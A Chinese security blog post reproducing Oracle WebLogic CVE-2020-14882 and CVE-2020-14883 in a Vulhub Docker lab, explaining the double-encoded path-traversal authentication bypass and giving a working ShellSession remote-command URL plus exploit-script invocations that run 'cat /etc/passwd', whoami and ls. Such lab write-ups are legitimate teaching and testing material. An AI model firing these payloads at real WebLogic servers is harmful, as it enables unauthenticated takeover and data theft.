# WebLogic未授权远程命令执行漏洞复现:原理详解+环境搭建+渗透实践(CVE-2020-14882、CVE-2020-14883)

原创 于 2025-10-29 18:42:43 发布 · 1.4k 阅读

· 27

· 30 ·

CC 4.0 BY-SA版权

版权声明:本文为博主原创文章,遵循 CC 4.0 BY-SA 版权协议,转载请附上原文出处链接和本声明。

文章标签:

#CVE-2020-14882 #WebLogic命令执行漏洞 #WebLogic未授权漏洞 #CVE-2020-14883

Web框架漏洞 专栏收录该内容

43 篇文章

订阅专栏

目录

一、WebLogic未授权远程命令执行漏洞

1、漏洞简介

2、漏洞原理

(1)正常访问流程

(2)权限绕过(CVE-2020-14882):

(3)命令执行(CVE-2020-14883):

二、环境搭建

1、确保系统已安装 Docker 和 Docker-Compose

2、下载 Vulhub

3、进入漏洞环境

4、启动漏洞环境

5、查看环境状态

三、未授权访问管理员后台

1、渗透实战

2、原理分析

四、命令执行(无回显)

1、构造PoC攻击URL

2、执行攻击PoC

3、查看攻击效果

五、命令执行(有回显)

1、攻击脚本下载

2、执行攻击

(1)查看cat /etc/passwd

(2)执行whoami命令

(3)执行ls命令

本文详细讲解WebLogic的CVE-2020-14882和CVE-2020-14883漏洞渗透的原理与渗透全流程。WebLogic的CVE-2020-14882漏洞可绕过认证直接访问管理后台并执行任意命令。该漏洞影响多个WebLogic版本,通过构造特殊URL(含双重编码的路径遍历)可绕过权限校验,结合CVE-2020-14883漏洞实现命令执行。实验环境使用Vulhub搭建,成功复现未授权访问和文件创建操作。攻击者可利用公开工具执行系统命令并获取回显(如查看/etc/passwd、执行whoami等)。该漏洞危害严重,建议及时升级修复。

## 一、WebLogic未授权远程命令执行漏洞

### 1、漏洞简介

WebLogic 未授权远程命令执行漏洞(CVE-2020-14882)是 Oracle WebLogic Server 中的一个严重安全漏洞。攻击者可以通过构造特殊的恶意HTTP请求,在未经过任何身份验证的情况下,直接访问WebLogic管理控制台的后台接口。结合另一个漏洞CVE-2020-14883(管理控制台中的命令执行漏洞),可以实现完整的未授权远程命令执行。

* CVE编号:CVE-2020-14882
* 漏洞类型:权限绕过导致的未授权远程命令执行
* 危害等级:高危 或 严重 (Critical)
* 影响版本:

  + Oracle WebLogic Server 10.3.6.0.0
  + Oracle WebLogic Server 12.1.3.0.0
  + Oracle WebLogic Server 12.2.1.3.0
  + Oracle WebLogic Server 12.2.1.4.0
  + Oracle WebLogic Server 14.1.1.0.0

### 2、漏洞原理

#### (1)正常访问流程

正常情况下,任何尝试访问WebLogic管理控制台(通常位于/console/)的请求,都会被重定向到登录页面(/console/login/LoginForm.jsp)。只有提供了有效的管理员凭证后,才能访问后台功能。

#### (2)权限绕过(CVE-2020-14882):

WebLogic对访问控制台的URL路径进行了校验,但其校验逻辑存在缺陷。攻击者可以通过以下方式绕过认证:

* 在请求的URL中插入特殊字符(如%252e%252e/或%2e%2e%2f,这些是../的双重URL编码形式),或者使用/console/console/这样的重复路径。
* 这种特殊的构造方式会欺骗WebLogic的权限校验机制,使其认为该请求是用于获取静态资源(如图片、CSS文件)或某些无需认证的公共接口,从而绕过了身份验证检查。
* 最终,攻击者可以直接访问到本应需要管理员权限才能访问的后台Servlet接口。

#### (3)命令执行(CVE-2020-14883):

光绕过认证还不够,还需要一个可以执行命令的"抓手"。CVE-2020-14883就是这个抓手。

* 它是一个存在于WebLogic管理控制台组件中的代码执行漏洞。
* 当攻击者通过CVE-2020-14882绕过认证后,可以访问到某个存在缺陷的后台Servlet(如ConsoleServlet),并向其传递恶意参数。
* 该Servlet在处理这些参数时,会最终调用Java的Runtime.getRuntime().exec()函数,从而执行攻击者提供的操作系统命令。

## 二、环境搭建

### 1、确保系统已安装 Docker 和 Docker-Compose

本文使用Vulhub复现Jenkins-CI漏洞,由于Vulhub 依赖于 Docker 环境,需要确保系统中已经安装并启动了 Docker 服务,命令如下所示。

```
# 检查 Docker 是否安装 docker --version docker-compose --version # 检查 Docker 服务状态 sudo systemctl status docker
```

### 2、下载 Vulhub

将 Vulhub 项目克隆到本地,具体命令如下所示。

```
git clone https://github.com/vulhub/vulhub.git cd vulhub
```

### 3、进入漏洞环境

Vulhub 已经准备好现成的漏洞环境,我们只需进入对应目录。注意:docker需要管理员权限运行,故而注意需要切换到root执行后续的docker命令。

```
cd weblogic cd CVE-2020-14882
```

### 4、启动漏洞环境

在CVE-2020-14882目录下,使用docker-compose up -d命令启动环境。Vulhub 的脚本会自动从 Docker Hub 拉取预先构建好的镜像并启动容器

```
docker-compose up -d
```

命令执行后,Docker 会完成拉取一个包含weblogic12.2.1.3-2018(受影响版本)的镜像。

### 5、查看环境状态

使用 docker ps 命令确认容器启动状态,说明由Vulhub 项目提供的 WebLogic 漏洞镜像(版本 12.2.1.3,存在 CVE-2020-14882 漏洞),容器已正常运行 17 分钟,通过宿主机器的 7001 端口可访问容器内的 WebLogic 管理控制台,可用于测试 CVE-2020-14882 漏洞的利用。

```
docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fe62aa6e46ca vulhub/weblogic:12.2.1.3-2018 "/u01/oracle/createA..." 17 minutes ago Up 17 minutes 0.0.0.0:7001->7001/tcp, :::7001->7001/tcp cve-2020-14882_weblogic_1
```

| 字段值 | 字段含义 | 详细说明 |
| --- | --- | --- |
| fe62aa6e46ca | 容器 ID(Container ID) | Docker 为每个运行的容器分配的唯一 64 位十六进制 ID,此处显示前 12 位缩写形式。可通过该 ID 操作容器(如停止、删除、进入容器等,例:docker stop fe62aa6e46ca)。 |
| vulhub/weblogic:12.2.1.3-2018 | 基础镜像(Image) | - vulhub:是一个知名的漏洞环境镜像仓库,专门提供各类漏洞的可复现 Docker 镜像,方便安全测试、漏洞学习使用。 - weblogic:镜像对应的应用程序,即 Oracle WebLogic Server。 - 12.2.1.3-2018:镜像标签,明确该 WebLogic 的版本为12.2.1.3(属于 CVE-2020-14882 漏洞的影响版本之一),且镜像构建基于 2018 年的基础环境(未修复后续漏洞)。 |
| "/u01/oracle/createA..." | 容器启动命令(Command) | 容器启动时执行的初始化脚本路径(完整路径通常为/u01/oracle/createAndStartWebLogic.sh),作用是自动创建 WebLogic 域、配置服务,并启动 WebLogic 服务器,确保容器启动后可直接访问 WebLogic 服务。 |
| 17 minutes ago | 容器创建时间 | 该容器在查看命令执行前 17 分钟被创建。 |
| Up 17 minutes | 容器运行状态 | 容器已持续运行 17 分钟("Up" 表示正常运行中;若为 "Exited" 则表示已停止)。 |
| 0.0.0.0:7001->7001/tcp, :::7001->7001/tcp | 端口映射(Ports) | Docker 的端口转发配置: - 宿主机器(你的本地电脑或服务器)的7001端口(TCP 协议),映射到容器内部的7001端口。 - 0.0.0.0:7001表示 IPv4 地址上所有网卡的 7001 端口都可访问;:::7001表示 IPv6 地址的同样配置。 - WebLogic 的默认管理控制台端口就是7001,因此可通过http://宿主IP:7001/console访问容器内的 WebLogic 控制台。 |
| cve-2020-14882\_weblogic\_1 | 容器名称(Name) | 用户(或 Vulhub 脚本)为容器指定的名称,明确指向该容器的用途:用于复现CVE-2020-14882 漏洞的 WebLogic 容器,后缀\_1通常是批量创建时的序号(若只创建 1 个,则为\_1)。 |

## 三、未授权访问管理员后台

### 1、渗透实战

Docker启动完成后,攻击者可以构造特殊请求的URL,即可直接访问到管理后台页面:访问http://192.168.59.128:7001/console/css/%252e%252e%252fconsole.portal,如下所示未授权访问成功。

### 2、原理分析

我们来分析这个URL的含义,攻击者试图让WebLogic认为这是一个对静态资源 (/css/目录) 的请求,从而绕过对 /console.portal 这个敏感接口的权限检查。通过路径遍历,最终成功访问到需要高权限的 console.portal 接口,而无需提供任何管理员用户名和密码。

```
http://192.168.59.128:7001/console/css/%252e%252e%252fconsole.portal
```

* %252e%252e%252f 是双重URL编码后的 ../。

  + 第一层解码:Web服务器或Java应用会首先对URL进行解码,将 %25 解码成 % 符号本身。所以解码后变成:%2e%2e%2f

    - %2e -> .
    - %2f -> /
  + 第二层解码:WebLogic在处理路径时,可能会再次进行解码(或规范化),于是 %2e%2e%2f 被第二次解码,最终变成:../
  + 最终效果:整个路径在经过两次解码后,被WebLogic理解为:/console/css/../console.portal
* 经过所有解码后,WebLogic最终处理的实际路径是:/console/css/../console.portal在操作系统中,../ 表示上级目录。路径遍历后,上述路径等价于:/console/console.portal

## 四、命令执行(无回显)

### 1、构造PoC攻击URL

我们尝试执行一个命令,例如 touch /tmp/mooyuan888。如果成功,会在目标服务器的 /tmp 目录下创建一个名为mooyuan888的文件,这是漏洞利用成功的标志。我们先进入容器,查看下/tmp下文件,如下所示不存在mooyuan888这个文件。

将攻击者想对192.168.59.128执行攻击命令(touch /tmp/mooyuan888),攻击命令为exec('touch%20/tmp/mooyuan888')。CVE-2020-14883中构造URL攻击PoC,注意黄色字体,http://192.168.59.128:7001/console/css/%252e%252e%252fconsole.portal?\_nfpb=true&\_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/mooyuan888');") 访问URL如下所示。

```
http://192.168.59.128:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/mooyuan888');")
```

* ?\_nfpb=true&\_pageLabel=: 这些是 console.portal 接口预期的正常参数,用于使请求看起来合法。
* &handle=com.tangocl.coherence.mvel2.sh.ShellSession(...): 这是攻击的核心。

  + handle: 漏洞参数。
  + com.tangosol.coherence.mvel2.sh.ShellSession: 一个WebLogic内置的类,可以执行MVEL表达式。
  + java.lang.Runtime.getRuntime().exec(...): 在MVEL表达式中调用Java方法,用于执行系统命令。

### 2、执行攻击PoC

通过访问构造的ULR,攻击者发送这个精心构造的HTTP请求到目标WebLogic服务器。

### 3、查看攻击效果

查看/tmp路径下的文件及子路径,如下所示在/tmp路径下成功创建了mooyuan888文件,命令执行成功!至此,漏洞复现成功。

## 五、命令执行(有回显)

### 1、攻击脚本下载

CVE-2020-14882\_ALL综合利用工具,支持命令回显检测,Github库地址如下所示。

```
https://github.com/GGyao/CVE-2020-14882_ALL
```

### 2、执行攻击

#### (1)查看cat /etc/passwd

python CVE-2020-14882\_ALL.py -u http://192.168.59.128:7001 -c "cat /etc/passwd"

#### (2)执行whoami命令

python CVE-2020-14882\_ALL.py -u http://192.168.59.128:7001 -c "whoami"

#### (3)执行ls命令

python CVE-2020-14882\_ALL.py -u http://192.168.59.128:7001 -c "ls"

关注博主即可阅读全文

确定要放弃本次机会?

福利倒计时

: :

立减 ¥

普通VIP年卡可用

立即使用

mooyuan天天

关注 关注

* 27

  点赞
* 踩
* 30

  收藏

  觉得还不错? 一键收藏
* 0

  评论
* 分享

  复制链接

  分享到 QQ

  分享到新浪微博

  扫一扫
* 打赏

  打赏
* 打赏 举报

  举报

专栏目录

Weblogic-未授权命令执行漏洞(CVE-2020-14882&14883)

qq\_43381463的博客

03-29 609

CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台,CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链,可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。

Weblogic 管理控制台未授权远程命令执行漏洞(CVE-2020-14882,CVE-2020-14883)

最新发布

m0\_68045701的博客

07-10 2819

在2020年10月的更新中,Oracle官方修复了两个长亭科技安全研究员@voidfyoo 提交的安全漏洞,分别是CVE-2020-14882和CVE-2020-14883。CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台,CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。首先,我们需要构造一个XML文件,并将其保存在Weblogic可以访问到的服务器上,如。访问后台后是一个低权限的用户,无法安装应用,也无法直接执行任意代码。

参与评论 您还未登录,请先 登录 后发表或查看评论

Weblogic 常见漏洞分析与利用

热门推荐

未完成的歌~的博客

03-23 1万+

一直没有系统的总结过 weblogic 的漏洞,今天通过 vulhub 靶场来复现几个经典的案例。WebLogic 是美国 Oracle 公司出品的一个基于 JAVAEE 架构的中间件,是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的Java应用服务器。WebLogic 由纯 Java 开发,长期以来一直被认为是市场上最好的J2EE工具之一,被广泛应用于开发、部署和运行 Java 应用等适用于本地环境和云环境的企业应用。

Weblogic常见漏洞详解

m0\_64481831的博客

03-01 5353

Weblogic 是一个基于JavaEE架构的中间件,是用于开发、集成、部署和管理大型分布式为Web应用、网络应用和数据库应用的Java应用服务器。Weblogic由纯Java开发,被广泛应用于开发、部署和运行Java应用等适用于本地环境和云环境的企业应用。所以,Weblogic在面试当中被提到频率还蛮高的。这篇文章以vulhub靶场为辅。Weblogic中间件常见漏洞文章讲了任意文件读取和弱口令登录、未授权访问后台和HTTP请求远程代码执行、SSRF利用、XMLDecoder反序列化漏洞。

CVE-2020-14882 weblogic未授权远程命令执行漏洞

栉风沐雪的博客

02-22 6104

Oracle WebLogic Server 远程代码执行漏洞 (CVE-2020-14882)POC 被公开,未经身份验证)的远程攻击者可通过构造特殊的 HTTP GET 请求,结合 CVE-2020-14883 漏洞进行利用,利用此漏洞可在未经身份验证的情况下直接接管 WebLogic Server Console ,并执行任意代码,利用门槛低,危害巨大。Oracle WebLogic Server,版本10.3.6.0,12.1.3.0,12.2.1.3,12.2.1.4,14.1.1.0。

Weblogic未授权远程代码执行漏洞 (CVE-2023-21839)

weixin\_45653478的博客

05-14 1356

CVE-2023-21839是一个针对Oracle WebLogic Server的远程代码执行漏洞。WebLogic是美国Oracle公司出品的一个Java应用服务器,用于本地和云端开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用。该漏洞源于WebLogic IIOP/T3协议存在的缺陷,当IIOP/T3协议开启时,允许未经身份验证的攻击者通过该协议网络访问并攻击存在安全风险的WebLogic Server。

CVE-2020-14882、CVE-2020-14883 Weblogic 管理控制台未授权远程命令执行漏洞

weixin\_45715461的博客

07-02 1596

CVE-2020-14882、CVE-2020-14883 Weblogic 管理控制台未授权远程命令执行漏洞

CVE-2020-14882&14883:Weblogic RCE复现1

08-03

声明:请勿用作违法用途,否则后果自负0x01 简介用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。0x02 漏洞概述编

CVE-2020-14882&14883:weblogic 未授权命令执行漏洞复现

Jietewang的博客

12-01 2995

1.Weblogic简介 Oracle WebLogic Server是用于构建和部署企业Java EE应用程序的业界最佳应用程序服务器,并支持新功能,这些新功能可降低运营成本,提高性能,增强可伸缩性并支持Oracle Applications产品组合。 这是一个Java的中间件,本人是这么理解的那要想更加详细的理解请查看官方介绍【官方介绍】。 2.漏洞描述 复现漏洞编号CVE-2020-14882,CVE-2020-14883 可以构造特殊的HTTP请求,在未经身份验证的情况下访问Weblogi

【漏洞复现】Weblogic未授权命令执行漏洞( CVE-2020-14882)

weixin\_43486390的博客

12-17 2679

CVE-2020-14882

CVE-2020-14882 weblogic 未授权命令执行复现

weixin\_37104668的博客

12-06 578

Weblogic简介 WebLogic是美国Oracle公司出品的一个application server,确切的说是一个基于JAVAEE架构的中间件,WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 WebLogic是美商Oracle的主要产品之一,是并购BEA得来。是商业市场上主要的Java(J2EE)应用服务器软件(applicati

Weblogic CVE-2020-14882 未授权远程命令执行漏洞

读书 买花 长大

02-25 773

CVE-2020-14882

WebLogic未授权任意文件上传漏洞

HAKUNAMATATATTA的博客

12-05 1193

在 Weblogic Web Service T est Page 中存在一处任意文件上传漏洞, Web Service TestPage 在"生产模式"下默认不开启,所以该漏洞有一定限制。利用该漏洞,可以上传任意 jsp 文件,进而获取服务器权限。

CVE-2020-14882&14883漏洞复现

m0\_52089634的博客

01-03 2305

CVE漏洞复现

简记 | CVE-2020-14882,CVE-2020-14883

bin789456的博客

10-25 562

原理简析:出现这个漏洞的关键就在于,如果请求的路径在 matchMap 列表里,那么 值就为 true ,这些是属于静态资源,没有做资源的限制和身份校验。近似于全局权限控制变量。在 方法首先判断 ,我们就可以通过修改请求 访问静态资源使值为true。后面要做的就是重定向,后面payload做了一个重定向最后请求portal文件,构建控件树最后目录穿越,获取到的文件也就是 webapp 下的 。

Weblogic未授权访问漏洞-CVE-2020-14882&&CVE-2020-14883

weixin\_51151498的博客

12-05 1906

weblogic漏洞复现

mooyuan天天

博客等级

码龄8年

领域专家: 信息安全技术领域

:   610

原创

:   1万+

点赞

:   1万+

收藏

:   1万+

粉丝

关注

私信

### 热门文章

* 机器学习笔记:训练集、验证集与测试集 44786
* numpy的loadtxt遇到问题:ValueError: Wrong number of columns at line 2 原因调查 15812
* Kali系统MSF模块暴力破解MySQL弱口令漏洞 12144
* iwebsec靶场安装教程(两种方法) 7790
* DPDK编译错误 error: Permission denied与RTE\_MAX\_LCORE undeclared here (not in a function) 解决方法 7198

### 分类专栏

* CISP-PTE 28篇
* 内网渗透 31篇
* 红日靶场 18篇
* sqli-labs靶场 73篇
* 系统漏洞 41篇
* Web框架漏洞 43篇
* 渗透工具 16篇
* CTFHub靶场 80篇
* pikachu靶场 45篇
* Web安全之机器学习入门 57篇
* DVWA靶场 53篇
* iwebsec靶场 55篇
* webug3.0靶场 19篇
* webug4.0靶场 31篇
* upload-labs靶场 23篇
* Web安全之深度学习实战 21篇
* Web安全之强化学习与GAN
* AI安全之对抗样本入门
* 机器学习与安全
* 网络安全之机器学习
* 人工智能在网络安全中的应用
* 基于数据科学的恶意软件分析
* 机器学习 3篇
* 经典书籍阅读 2篇
* dpdk 3篇
* 网络安全 3篇

展开全部 收起

上一篇:
:   IIS6远程代码执行漏洞复现3:原理详解+MSF反弹shell渗透实践(CVE-2017-7269)

下一篇:
:   ms14-064漏洞复现:原理详解+Windows Server2003渗透实践(CVE-2014-6332)

### 最新评论

* 网络安全渗透靶场学习经验&2025年个人博客技术深度总结

  全栈小5: 网络安全渗透靶场学习经验

### 大家在看

* 讲讲Spring MVC的处理流程
* 在算法生成艺术的浪潮中,人类创造力的不可替代性验证 14
* 中国电网Java面试被问:RPC序列化的协议升级和向后兼容 418
* AI工具数据训练暗流:测试从业者的隐私危机与防御策略 44
* 信不信?一天让你从Java工程师变成Go开发者 246

### 最新文章

* CISP-PTE SQL注入关卡渗透实战(手注法+sqlmap法)
* CISP-PTE 文件上传关卡 渗透实战+代码审计
* CTF-PTE 反序列化
* 2026年28篇
* 2025年452篇
* 2024年12篇
* 2023年10篇
* 2022年103篇
* 2019年4篇
* 2017年1篇

### 目录

展开全部

收起

### 目录

展开全部

收起

上一篇:
:   IIS6远程代码执行漏洞复现3:原理详解+MSF反弹shell渗透实践(CVE-2017-7269)

下一篇:
:   ms14-064漏洞复现:原理详解+Windows Server2003渗透实践(CVE-2014-6332)

### 分类专栏

* CISP-PTE 28篇
* 内网渗透 31篇
* 红日靶场 18篇
* sqli-labs靶场 73篇
* 系统漏洞 41篇
* Web框架漏洞 43篇
* 渗透工具 16篇
* CTFHub靶场 80篇
* pikachu靶场 45篇
* Web安全之机器学习入门 57篇
* DVWA靶场 53篇
* iwebsec靶场 55篇
* webug3.0靶场 19篇
* webug4.0靶场 31篇
* upload-labs靶场 23篇
* Web安全之深度学习实战 21篇
* Web安全之强化学习与GAN
* AI安全之对抗样本入门
* 机器学习与安全
* 网络安全之机器学习
* 人工智能在网络安全中的应用
* 基于数据科学的恶意软件分析
* 机器学习 3篇
* 经典书籍阅读 2篇
* dpdk 3篇
* 网络安全 3篇

展开全部 收起

### 目录

评论

条评论被折叠 查看

被折叠的 条评论 为什么被折叠? 到【灌水乐园】发言

查看更多评论

添加红包

成就一亿技术人!

领取后你会自动成为博主和红包主的粉丝 规则

hope\_wisdom

发出的红包

打赏作者

mooyuan天天 你的鼓励将是我创作的最大动力

¥1 ¥2 ¥4 ¥6 ¥10 ¥20

扫码支付:¥1

获取中

扫码支付

您的余额不足,请更换扫码支付或充值

打赏作者

实付元

使用余额支付

点击重新获取

扫码支付

钱包余额 0

抵扣说明:

1.余额是钱包充值的虚拟货币,按照1:1的比例进行支付金额的抵扣。 2.余额无法直接购买下载,可以购买VIP、付费专栏及课程。

余额充值
